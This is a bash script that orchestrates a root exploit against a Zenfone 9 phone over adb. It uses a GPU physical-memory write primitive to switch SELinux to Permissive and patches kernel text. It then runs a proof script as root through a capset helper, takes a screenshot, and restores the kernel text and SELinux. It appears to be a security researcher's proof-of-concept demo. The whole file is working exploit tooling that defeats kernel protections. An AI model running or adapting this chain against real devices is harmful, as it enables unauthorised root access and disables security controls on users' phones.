#!/usr/bin/env bash
# demo-root.sh — one full root session that produces on-screen + on-disk proof, then cleans up.
# Flow: SELinux permissive -> patch text -> run proof.sh as root -> screenshot -> restore everything.
set -u
[ -f "$(dirname "$0")/../device.env" ] && . "$(dirname "$0")/../device.env"
S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}

# --- GPU activity harness -------------------------------------------------------------
# The primitives only take effect while the display is awake and the GPU is actively rendering.
# A background screenrecord is NOT sufficient (measured 0/4 writes idle/dark vs 3/4 awake+animating).
gpu_anim_start() {
    # idempotent: don't disturb an animation the caller already started
    if adb -s "$S" shell 'pgrep -f anim.sh >/dev/null 2>&1' </dev/null >/dev/null 2>&1; then
        adb -s "$S" shell 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard' </dev/null >/dev/null 2>&1
        return 0
    fi
    adb -s "$S" push "$(dirname "$0")/../src/anim.sh" /data/local/tmp/anim.sh </dev/null >/dev/null 2>&1
    adb -s "$S" shell 'chmod 755 /data/local/tmp/anim.sh; svc power stayon true' </dev/null >/dev/null 2>&1
    adb -s "$S" shell 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard' </dev/null >/dev/null 2>&1
    adb -s "$S" shell 'nohup sh /data/local/tmp/anim.sh >/dev/null 2>&1 &' </dev/null >/dev/null 2>&1
    sleep 3
}
gpu_anim_stop() {
    adb -s "$S" shell 'pkill -f anim.sh' </dev/null >/dev/null 2>&1
    adb -s "$S" shell 'svc power stayon false' </dev/null >/dev/null 2>&1
}
DIR=$(cd "$(dirname "$0")" && pwd)
LOG=$HOME/Dev/zenfone9-root/logs/root-demo-$(date +%Y%m%d-%H%M%S)
mkdir -p "$LOG"


# NOTE: reads race too when the GPU is idle, so patch-dwords.sh keeps a screenrecord load alive
# for the whole operation. This script additionally keeps the screen awake between steps.
sel() {  # $1 = selinux_state dword, $2 = wanted getenforce; verify it FLIPS AND STICKS
    for attempt in $(seq 1 12); do
        adb -s "$S" shell "CHEESE_POKE=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=0xaaa40b98 \
CHEESE_WRITE_PA=0xaaa40b98 CHEESE_WRITE_VAL=$1 timeout 180 /data/local/tmp/cheese_pa \
> /data/local/tmp/pk.txt 2>&1; grep -o 'POKE write.*' /data/local/tmp/pk.txt | tail -1" </dev/null >/dev/null 2>&1
        sleep 1
        cur=$(adb -s "$S" shell getenforce </dev/null 2>&1)
        if [ "$cur" = "$2" ]; then
            sleep 5
            cur2=$(adb -s "$S" shell getenforce </dev/null 2>&1)
            [ "$cur2" = "$2" ] && { echo "[demo]   selinux=$2 (sticky after 5s, attempt $attempt)"; return 0; }
            echo "[demo]   reverted to $cur2 (something re-asserts it) - waiting 20s"
            sleep 20
        else
            echo "[demo]   flip attempt $attempt: getenforce=$cur (want $2)"
            sleep 5
        fi
    done
    return 1
}

clean=0
restore() {
    [ "$clean" = 1 ] && return 0
    clean=1
    echo "[demo] restoring kernel text..."
    "$DIR/patch-dwords.sh" restore 2>&1 | tail -1
    echo "[demo] restoring SELinux Enforcing..."
    gpu_anim_stop
    sel 0x01010001 Enforcing >/dev/null || echo "[demo] WARNING: SELinux not restored - reboot will fix"
    echo "[demo] clean: text pristine, SELinux Enforcing"
}
trap restore EXIT INT TERM

adb -s "$S" push "$DIR/../src/proof.sh" /data/local/tmp/proof.sh </dev/null >/dev/null
adb -s "$S" shell 'chmod 755 /data/local/tmp/proof.sh' </dev/null >/dev/null

gpu_anim_start   # must be running before ANY GPU-primitive op, including the SELinux flip
echo "[demo] SELinux -> Permissive (GPU load active)"
sel 0x01010000 Permissive || { echo "[demo] SELinux flip FAILED - aborting before patch"; exit 1; }
echo "[demo] getenforce: $(adb -s "$S" shell getenforce </dev/null 2>&1)"

echo "[demo] patching kernel text (13 dwords, verified, ~5-10 min)..."
if ! "$DIR/patch-dwords.sh" write 2>&1 | tail -2; then :; fi
if ! "$DIR/patch-dwords.sh" verify 2>&1 | tail -2 | grep -q "FULLY PATCHED"; then
    echo "[demo] patch NOT fully verified - aborting (no root attempt, no partial-patch risk)"
    exit 1
fi
echo "[demo] patch verified: FULLY PATCHED"

# something can re-assert enforcing shortly after boot, so re-check right before rooting
sel 0x01010000 Permissive || { echo "[demo] SELinux not permissive - root would be killed"; exit 1; }
echo "[demo] getenforce (pre-root): $(adb -s "$S" shell getenforce </dev/null 2>&1)"
gpu_anim_start   # the root call + proof reads are GPU-primitive ops too: keep the GPU busy
echo "[demo] === running proof.sh AS ROOT ==="
adb -s "$S" shell '/data/local/tmp/call_capset sh /data/local/tmp/proof.sh' </dev/null 2>&1 | tee "$LOG/proof.txt"

echo "[demo] rendering proof page on device screen..."
adb -s "$S" shell 'am start -a android.intent.action.VIEW -d file:///sdcard/root-proof.html -t text/html' </dev/null >/dev/null 2>&1
sleep 4
adb -s "$S" shell 'cmd statusbar expand-notifications' </dev/null >/dev/null 2>&1
sleep 2
adb -s "$S" exec-out screencap -p > "$LOG/root-proof-screen.png"
adb -s "$S" shell 'cmd statusbar collapse' </dev/null >/dev/null 2>&1
echo "[demo] screenshot: $LOG/root-proof-screen.png ($(du -h "$LOG/root-proof-screen.png" | cut -f1))"

restore
trap - EXIT INT TERM
echo "[demo] post-restore check:"; "$DIR/patch-dwords.sh" verify 2>&1 | tail -2
echo "[demo] logdir: $LOG"
